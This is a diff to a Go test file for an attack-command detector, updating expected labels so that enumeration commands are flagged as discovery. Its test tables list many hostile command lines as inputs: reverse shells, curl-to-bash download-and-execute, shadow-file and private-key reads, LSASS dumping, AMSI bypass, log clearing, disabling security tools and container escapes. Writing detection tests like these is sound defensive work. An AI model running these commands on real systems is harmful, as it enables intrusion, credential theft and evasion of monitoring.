@@ -38,7 +38,7 @@ func TestDetect(t *testing.T) {
 		{"role assignment rest", `requests.post("https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments", json=body)`, []string{"RoleAssignment"}},
 		{"role assignments read", "curl -s https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments", []string{"GraphDirectoryEnumeration"}},
 		{"azure rbac", `az role assignment create --assignee $APP --role "User Access Administrator" --scope /`, []string{"RoleAssignment"}},
-		{"azure rbac list", "az role assignment list --all", nil},
+		{"azure rbac list", "az role assignment list --all", []string{"CloudGroupEnumeration"}},
 		{"app role rest", "POST https://graph.microsoft.com/v1.0/servicePrincipals/1f2e/appRoleAssignments", []string{"AppRoleAssignment"}},
 		{"app role assigned to", `Invoke-MgGraphRequest -Method POST -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/$id/appRoleAssignedTo" -Body $b`, []string{"AppRoleAssignment"}},
 		{"app role cmdlet", "New-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $sp -PrincipalId $sp -ResourceId $graph -AppRoleId $role", []string{"AppRoleAssignment"}},
@@ -134,7 +134,7 @@ func TestDetectWindows(t *testing.T) {
 		{"service created", `sc.exe \\dc01 create U binPath= x`, []string{"ServiceCreation"}},
 		{"services listed", `sc query`, []string{"ServiceDiscovery"}},
 		{"log cleared", `wevtutil cl Security`, []string{"EventLogClearing"}},
-		{"log read", `wevtutil qe Security /c:5`, nil},
+		{"log read", `wevtutil qe Security /c:5`, []string{"LogEnumeration"}},
 		{"hive saved", `reg save HKLM\SAM C:\Users\Public\s.hiv`, []string{"RegistryHiveDump"}},
 		{"memory dump", `rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\l.dmp full`, []string{"SignedBinaryProxyExecution", "LsassDump"}},
 		{"scan interface", `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')`, []string{"AmsiBypass"}},
@@ -173,7 +173,7 @@ var linuxCases = []struct {
 	{`useradd -m -s /bin/bash svc`, []string{"AccountCreation"}},
 	{`net user svc "$P" /add`, []string{"AccountCreation"}},
 	{`New-LocalUser -Name svc`, []string{"AccountCreation"}},
-	{`net user`, nil},
+	{`net user`, []string{"LocalAccountEnumeration"}},
 	{`echo "$KEY" >> ~/.ssh/authorized_keys`, []string{"SshKeyPersistence"}},
 	{`ssh-copy-id -i k.pub user@10.0.0.5`, []string{"SshKeyPersistence"}},
 	{`cat ~/.ssh/authorized_keys`, nil},
@@ -190,8 +190,8 @@ var linuxCases = []struct {
 	{`docker run --privileged -it alpine sh`, []string{"ContainerEscape"}},
 	{`docker run -v /:/host alpine ls /host`, []string{"ContainerEscape"}},
 	{`nsenter -t 1 -m -u -i -n sh`, []string{"ContainerEscape"}},
-	{`curl --unix-socket /var/run/docker.sock http://localhost/containers/json`, []string{"ContainerEscape"}},
-	{`docker ps`, nil},
+	{`curl --unix-socket /var/run/docker.sock http://localhost/containers/json`, []string{"ContainerEscape", "ContainerResourceDiscovery"}},
+	{`docker ps`, []string{"ContainerResourceDiscovery"}},
 	{`insmod ./mod.ko`, []string{"KernelModuleLoad"}},
 	{`modprobe mod`, []string{"KernelModuleLoad"}},
 	{`modprobe -r mod`, nil},
@@ -203,7 +203,7 @@ var linuxCases = []struct {
 
 	{`cat /etc/shadow > s.txt`, []string{"ShadowFileRead"}},
 	{`unshadow p s > u`, []string{"ShadowFileRead"}},
-	{`cat /etc/passwd`, nil},
+	{`cat /etc/passwd`, []string{"LocalAccountEnumeration"}},
 	{`cat ~/.ssh/id_rsa`, []string{"PrivateKeyRead"}},
 	{`cp /etc/ssh/ssh_host_rsa_key .`, []string{"PrivateKeyRead"}},
 	{`cat ~/.ssh/id_rsa.pub`, nil},
@@ -221,12 +221,12 @@ var linuxCases = []struct {
 	{`kubectl get secrets -A -o yaml`, []string{"ClusterSecretRead"}},
 	{`cat /var/run/secrets/kubernetes.io/serviceaccount/token`, []string{"ClusterSecretRead"}},
 	{`curl -sk "$API/api/v1/namespaces/default/secrets"`, []string{"ClusterSecretRead"}},
-	{`kubectl get pods`, nil},
+	{`kubectl get pods`, []string{"ContainerResourceDiscovery"}},
 
 	{`rm -f /var/log/auth.log`, []string{"LogDeletion"}},
 	{`: > /var/log/wtmp`, []string{"LogDeletion"}},
 	{`journalctl --vacuum-time=1s`, []string{"LogDeletion"}},
-	{`tail /var/log/syslog`, nil},
+	{`tail /var/log/syslog`, []string{"LogEnumeration"}},
 	{`history -c`, []string{"HistoryClearing"}},
 	{`rm -f ~/.bash_history`, []string{"HistoryClearing"}},
 	{`cat /dev/null > ~/.bash_history`, []string{"HistoryClearing"}},
@@ -240,7 +240,7 @@ var linuxCases = []struct {
 	{`service rsyslog stop`, []string{"SecurityToolDisabling"}},
 	{`auditctl -e 0`, []string{"SecurityToolDisabling"}},
 	{`pkill -9 auditd`, []string{"SecurityToolDisabling"}},
-	{`systemctl status auditd`, []string{"ServiceDiscovery"}},
+	{`systemctl status auditd`, []string{"ServiceDiscovery", "SecuritySoftwareDiscovery"}},
 	{`iptables -F`, []string{"FirewallDisabling"}},
 	{`iptables -P INPUT ACCEPT`, []string{"FirewallDisabling"}},
 	{`ufw disable`, []string{"FirewallDisabling"}},
@@ -258,7 +258,7 @@ var linuxCases = []struct {
 	{`nc "$H" "$PORT" -e /bin/sh`, []string{"ReverseShell"}},
 	{`socat tcp:$H:$PORT exec:$SH`, []string{"ReverseShell"}},
 	{`pty.spawn(shell)`, []string{"ReverseShell"}},
-	{`nc -zv 10.0.0.5 22`, nil},
+	{`nc -zv 10.0.0.5 22`, []string{"NetworkServiceDiscovery"}},
 	{`curl -fsSL "$U" | sudo bash`, []string{"ShellDownloadAndExecute"}},
 	{`wget -qO- "$U" | python3`, []string{"ShellDownloadAndExecute"}},
 	{`bash -c "$(curl -fsSL "$U")"`, []string{"ShellDownloadAndExecute"}},
@@ -541,6 +541,9 @@ func corpus() []string {
 	for _, c := range shareCases {
 		lines = append(lines, c.line)
 	}
+	for _, c := range discoveryCases {
+		lines = append(lines, c.line)
+	}
 	return lines
 }
 
@@ -566,7 +569,7 @@ var shareCases = []struct {
 	{`showmount -e 10.20.1.40`, []string{"NetworkShareDiscovery"}},
 	{`nmap --script smb-enum-shares -p445 10.20.1.5`, []string{"NetworkShareDiscovery"}},
 	{`Snaffler.exe -s -o snaffler.log`, []string{"NetworkShareDiscovery"}},
-	{`net view`, nil},
+	{`net view`, []string{"RemoteSystemDiscovery"}},
 	{`net share loot=C:\loot /grant:everyone,full`, nil},
 	{`smbmap -H 10.20.1.17 -u svc -p "$P" -x 'whoami'`, nil},
 	{`enum4linux -U 10.20.1.5`, nil},
@@ -579,7 +582,7 @@ var shareCases = []struct {
 	{`$net.MapNetworkDrive("Z:", "\\fs01\finance")`, []string{"NetworkShareConnection"}},
 	{`mount -t cifs //fs01.corp.local/finance /mnt/fin -o username=svc,password="$P"`, []string{"NetworkShareConnection"}},
 	{`smbclient //10.20.1.5/C$ -U 'corp/administrator%P@ss'`, []string{"NetworkShareConnection"}},
-	{`net use`, nil},
+	{`net use`, []string{"NetworkConnectionDiscovery"}},
 	{`mount /dev/sdb1 /mnt/usb`, nil},
 	{`mount -t nfs 10.20.1.40:/export /mnt/nfs`, nil},
 	{`mount -t davfs https://dav.example.net/files /mnt/dav`, nil},
